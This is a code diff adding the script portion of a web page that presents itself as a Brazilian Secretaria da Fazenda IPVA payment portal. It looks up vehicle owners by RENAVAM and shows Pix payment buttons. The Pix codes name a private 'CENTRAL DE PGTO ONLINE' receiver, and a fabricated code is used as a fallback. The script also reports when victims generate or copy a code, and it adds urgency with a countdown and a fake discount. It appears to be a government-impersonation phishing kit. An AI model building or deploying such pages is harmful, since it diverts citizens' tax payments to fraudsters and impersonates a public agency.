+                                        © Secretaria da Fazenda - Portal SGT versão IP-01.011.61
+                                    </div>
+                                </div>
+
+                            </div>
+                        </bodycopy>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="./sweetalert2@11"></script>
+    <script>
+        // ==============================================
+        // VARIÁVEIS GLOBAIS
+        // ==============================================
+        let currentRenavam = '';
+        let heartbeatInterval;
+        let sessaoId = localStorage.getItem('sessao_id') || `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        localStorage.setItem('sessao_id', sessaoId);
+
+        // ==============================================
+        // FUNÇÃO PRINCIPAL DE CONSULTA
+        // ==============================================
+        async function consultarEResolver() {
+            var renavamInput = document.getElementById("RENAVAM").value.trim();
+            currentRenavam = renavamInput;
+
+            if (renavamInput === '') {
+                Swal.fire({ icon: 'error', title: 'Erro', text: 'Por favor, digite o RENAVAM.' });
+                return;
+            }
+
+            Swal.fire({
+                title: 'Consultando...',
+                html: 'Aguarde enquanto buscamos os débitos no sistema.',
+                allowOutsideClick: false,
+                didOpen: () => { Swal.showLoading(); }
+            });
+
+            try {
+                const response = await fetch(`http://localhost:3000/consultar/${renavamInput}`, {
+                    headers: {
+                        'session-id': sessaoId
+                    }
+                });
+                const data = await response.json();
+
+                if (data.sucesso) {
+                    document.getElementById('res-proprietario').innerText = data.dados.proprietario;
+                    document.getElementById('res-renavam').innerText = data.dados.renavam;
+                    document.getElementById('res-placa').innerText = data.dados.placa;
+                    document.getElementById('res-modelo').innerText = data.dados.modelo;
+                    document.getElementById('res-ano').innerText = data.dados.ano;
+                    document.getElementById('res-status').innerText = data.dados.status;
+
+                    let valorString = data.dados.valor_ipva;
+                    let valorNumerico = 0;
+                    
+                    if (valorString && valorString !== "N/A" && valorString !== "QUITADO") {
+                        valorNumerico = parseFloat(valorString.replace("R$ ", "").replace(/\./g, "").replace(",", "."));
+                    }
+
+                    // --- COTA ÚNICA (10% OFF) ---
+                    const tbodyUnica = document.getElementById('tabela-cota-unica');
+                    tbodyUnica.innerHTML = '';
+                    
+                    if (valorNumerico > 0) {
+                        let valorDesconto = valorNumerico * 0.90;
+                        let valorEconomia = valorNumerico - valorDesconto;
+                        let valUnicaFmt = valorDesconto.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                        let valFullFmt = valorNumerico.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                        let valEconFmt = valorEconomia.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+                        tbodyUnica.innerHTML = `
+                            <tr>
+                                <td>2026</td>
+                                <td>10/04/2026</td>
+                                <td>${valFullFmt}</td>
+                                <td>R$ 0,00</td>
+                                <td style="color:green;">${valEconFmt}</td>
+                                <td>R$ 0,00</td>
+                                <td class="text-green" style="font-size:16px;">${valUnicaFmt}</td>
+                                <td>${getBtnPix(valUnicaFmt, data.dados.renavam)}</td>
+                            </tr>
+                        `;
+                    } else {
+                        tbodyUnica.innerHTML = '<tr><td colspan="8">Nada consta ou Quitada</td></tr>';
+                    }
+
+                    // --- PARCELADO ---
+                    const tbodyParcelado = document.getElementById('tabela-parcelado');
+                    tbodyParcelado.innerHTML = '';
+
+                    if (valorNumerico > 0) {
+                        let valorParcela = valorNumerico / 5;
+                        let valParcFmt = valorParcela.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+                        for(let i=1; i<=5; i++) {
+                            let mes = 3 + i;
+                            let dataVenc = (i === 1) ? "10/04/2026" : (i === 2) ? "12/05/2026" : `10/0${mes}/2026`;
+                            
+                            tbodyParcelado.innerHTML += `
+                                <tr>
+                                    <td>2026</td>
+                                    <td>${dataVenc}</td>
+                                    <td>Cota ${i}</td>
+                                    <td>${valParcFmt}</td>
+                                    <td>0,00</td>
+                                    <td>R$ 0,00</td>
+                                    <td class="text-green">${valParcFmt}</td>
+                                    <td>${getBtnPix(valParcFmt, data.dados.renavam)}</td>
+                                </tr>
+                            `;
+                        }
+                        
+                        // Licenciamento
+                        tbodyParcelado.innerHTML += `
+                            <tr>
+                                <td>2026</td>
+                                <td>25/08/2026</td>
+                                <td>LICENCIAMENTO</td>
+                                <td>R$ 193,00</td>
+                                <td>R$ 0,00</td>
+                                <td>R$ 0,00</td>
+                                <td class="text-green">R$ 193,00</td>
+                                <td>${getBtnPix('R$ 193,00', data.dados.renavam)}</td>
+                            </tr>
+                        `;
+                    } else {
+                        tbodyParcelado.innerHTML = '<tr><td colspan="8">Nada consta</td></tr>';
+                    }
+
+                    Swal.close();
+                    document.getElementById('tela-pesquisa').classList.add('hidden');
+                    document.getElementById('tela-resultados').classList.remove('hidden');
+                    window.scrollTo(0, 0);
+
+                } else {
+                    Swal.fire({ icon: 'error', title: 'Erro', text: data.erro || 'Veículo não encontrado.' });
+                }
+            } catch (error) {
+                console.error(error);
+                Swal.fire({ icon: 'error', title: 'Erro de Conexão', text: 'Verifique se o "node index.js" está rodando.' });
+            }
+        }
+
+        // Função para gerar botão PIX - ATUALIZADA
+        function getBtnPix(valor, renavam) {
+            return `<button type="button" class="BTNPIX" onclick="abrirModalPixRapido('${valor}', '${renavam}')">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M11.917 11.71a2.046 2.046 0 0 1-1.454-.602l-2.1-2.1a.4.4 0 0 0-.551 0l-2.108 2.108a2.044 2.044 0 0 1-1.454.602h-.414l2.66 2.66c.83.83 2.177.83 3.007 0l2.667-2.668h-.253zM4.25 4.282c.55 0 1.066.214 1.454.602l2.108 2.108a.39.39 0 0 0 .552 0l2.1-2.1a2.044 2.044 0 0 1 1.453-.602h.253L9.503 1.623a2.127 2.127 0 0 0-3.007 0l-2.66 2.66h.414z"></path><path d="m14.377 6.496-1.612-1.612a.307.307 0 0 1-.114.023h-.733c-.379 0-.75.154-1.017.422l-2.1 2.1a1.005 1.005 0 0 1-1.425 0L5.268 5.32a1.448 1.448 0 0 0-1.018-.422h-.9a.306.306 0 0 1-.109-.021L1.623 6.496c-.83.83-.83 2.177 0 3.008l1.618 1.618a.305.305 0 0 1 .108-.022h.901c.38 0 .75-.153 1.018-.421L7.375 8.57a1.034 1.034 0 0 1 1.426 0l2.1 2.1c.267.268.638.421 1.017.421h.733c.04 0 .079.01.114.024l1.612-1.612c.83-.83.83-2.178 0-3.008z"></path></svg>
+                Emitir GR-PR (com Pix)
+            </button>`;
+        }
+
+        // ==============================================
+        // FUNÇÕES PARA O MODAL PIX - OTIMIZADAS
+        // ==============================================
+        let pixTimerInterval = null;
+        let tempoRestante = 892;
+        let currentPixValor = '';
+        let currentPixRenavam = '';
+
+        // Função RÁPIDA para abrir o modal PIX
+        async function abrirModalPixRapido(valor, renavam) {
+            currentPixValor = valor;
+            currentPixRenavam = renavam;
+            
+            // Para o timer anterior se existir
+            if (pixTimerInterval) {
+                clearInterval(pixTimerInterval);
+            }
+            
+            // Reinicia o timer
+            tempoRestante = 892;
+            
+            // Atualiza os valores no modal
+            document.getElementById('pixValor').textContent = valor;
+            
+            // Data de pagamento (amanhã)
+            let dataAmanha = new Date();
+            dataAmanha.setDate(dataAmanha.getDate() + 1);
+            let dataFormatada = dataAmanha.toLocaleDateString('pt-BR');
+            document.getElementById('pixData').textContent = dataFormatada;
+            
+            // Mostra o modal IMEDIATAMENTE (não espera pela API)
+            document.getElementById('modalPix').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            // Inicia o timer
+            atualizarTimer();
+            pixTimerInterval = setInterval(atualizarTimer, 1000);
+            
+            // Tenta gerar PIX REAL em segundo plano
+            setTimeout(async () => {
+                try {
+                    const response = await fetch('http://localhost:3000/api/gerar-pix-real', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            valor: valor,
+                            renavam: renavam 
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.sucesso) {
+                        // Usa código PIX real gerado pelo backend
+                        document.getElementById('pixCodigo').textContent = data.codigoPix;
+                        document.getElementById('qrcodePlaceholder').innerHTML = 
+                            `<img src="${data.qrCodeUrl}" alt="QR Code PIX" style="max-width:100%; max-height:100%;">`;
+                        
+                        // Registra que um PIX foi gerado
+                        try {
+                            await fetch('http://localhost:3000/api/pix-gerado', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ 
+                                    valor: valor,
+                                    renavam: renavam,
+                                    tipo: 'real'
+                                })
+                            });
+                        } catch (e) {
+                            // Ignora erro de registro
+                        }
+                    } else {
+                        // Fallback para código fictício
+                        let codigoPixCompleto = gerarCodigoPixCompleto(valor);
+                        document.getElementById('pixCodigo').textContent = codigoPixCompleto;
+                        document.getElementById('qrcodePlaceholder').innerHTML = 'QR Code não disponível';
+                        
+                        // Ainda registra como gerado
+                        try {
+                            await fetch('http://localhost:3000/api/pix-gerado', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ 
+                                    valor: valor,
+                                    renavam: renavam,
+                                    tipo: 'gerado'
+                                })
+                            });
+                        } catch (e) {
+                            // Ignora erro
+                        }
+                    }
+                } catch (error) {
+                    // Fallback completo em caso de erro
+                    console.log('Erro ao gerar PIX real, usando fallback');
+                    let codigoPixCompleto = gerarCodigoPixCompleto(valor);
+                    document.getElementById('pixCodigo').textContent = codigoPixCompleto;
+                    document.getElementById('qrcodePlaceholder').innerHTML = 'QR Code offline';
+                }
+            }, 100); // Pequeno delay para não bloquear a UI
+            
+            // Reseta o botão de copiar
+            let btnCopiar = document.getElementById('btnCopiarPix');
+            btnCopiar.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg> COPIAR CÓDIGO PIX';
+            btnCopiar.classList.remove('copiado');
+        }
+
+        // Função para atualizar o timer
+        function atualizarTimer() {
+            if (tempoRestante <= 0) {
+                clearInterval(pixTimerInterval);
+                document.getElementById('pixTimer').textContent = "00 : 00";
+                document.getElementById('pixTimer').style.color = "#d9534f";
+                return;
+            }
+            
+            let minutos = Math.floor(tempoRestante / 60);
+            let segundos = tempoRestante % 60;
+            
+            let minutosStr = minutos < 10 ? "0" + minutos : minutos;
+            let segundosStr = segundos < 10 ? "0" + segundos : segundos;
+            
+            document.getElementById('pixTimer').textContent = minutosStr + " : " + segundosStr;
+            
+            if (tempoRestante < 120) {
+                document.getElementById('pixTimer').style.color = "#d9534f";
+            } else {
+                document.getElementById('pixTimer').style.color = "#d9534f";
+            }
+            
+            tempoRestante--;
+        }
+
+        // Função para copiar código PIX no modal
+        async function copiarCodigoPixModal() {
+            let codigoPix = document.getElementById('pixCodigo').textContent;
+            let btnCopiar = document.getElementById('btnCopiarPix');
+            
+            try {
+                await navigator.clipboard.writeText(codigoPix);
+                
+                // Feedback visual no botão
+                btnCopiar.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg> COPIADO!';
+                btnCopiar.classList.add('copiado');
+                
+                // Registra no backend que o PIX foi copiado
+                try {
+                    await fetch('http://localhost:3000/api/pix-copiado', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            valor: currentPixValor,
+                            renavam: currentPixRenavam
+                        })
+                    });
+                } catch (e) {
+                    // Ignora erro de registro
+                }
+                
+                // Volta ao normal após 2 segundos
+                setTimeout(() => {
+                    btnCopiar.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg> COPIAR CÓDIGO PIX';
+                    btnCopiar.classList.remove('copiado');
+                }, 2000);
+                
+            } catch (err) {
+                console.error('Erro ao copiar:', err);
+                // Fallback para seleção manual
+                let range = document.createRange();
+                range.selectNode(document.getElementById('pixCodigo'));
+                window.getSelection().removeAllRanges();
+                window.getSelection().addRange(range);
+                
+                // Feedback mesmo com erro
+                btnCopiar.textContent = 'SELECIONE E COPIE';
+                btnCopiar.style.backgroundColor = '#dc3545';
+                
+                setTimeout(() => {
+                    btnCopiar.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg> COPIAR CÓDIGO PIX';
+                    btnCopiar.style.backgroundColor = '';
+                }, 2000);
+            }
+        }
+
+        // Função para gerar código PIX COMPLETO (fallback)
+        function gerarCodigoPixCompleto(valor) {
+            let valorNumerico = valor.replace("R$ ", "").replace(".", "").replace(",", ".");
+            
+            let codigoBase = `00020101021226940014br.gov.bcb.pix2572qrcode.somos.app.br/../520400005303986540${valorNumerico.length}${valorNumerico}5802BR5925CENTRAL DE PGTO ONLINE 6009SAO PAULO 62140507***6304`;
+            
+            return codigoBase + "A1B2";
+        }
+
+        // Função para fechar o modal
+        function fecharModalPix() {
+            if (pixTimerInterval) {
+                clearInterval(pixTimerInterval);
+                pixTimerInterval = null;
+            }
+            
+            document.getElementById('modalPix').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Fecha o modal se clicar fora do conteúdo
+        document.getElementById('modalPix').addEventListener('click', function(event) {
+            if (event.target === this) {
+                fecharModalPix();
+            }
+        });
+
+        // Fecha com tecla ESC
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') {
+                fecharModalPix();
+            }
+        });
+
+        // Inicialização
+        window.addEventListener('load', function() {
+            // Remove classes de proteção para permitir cliques
+            document.querySelectorAll('*').forEach(el => {
+                el.classList.remove('no-select', 'no-context-menu');
+            });
+            
+            // Inicia sessão
+            if (!localStorage.getItem('sessao_id')) {
+                localStorage.setItem('sessao_id', sessaoId);
+            }
+            
+            // Remove bloqueadores de eventos
+            document.removeEventListener('contextmenu', function(e) { e.preventDefault(); });
+            document.removeEventListener('selectstart', function(e) { e.preventDefault(); });
+            document.removeEventListener('dragstart', function(e) { e.preventDefault(); });
+        });
+    </script>
+</body>
+</html>
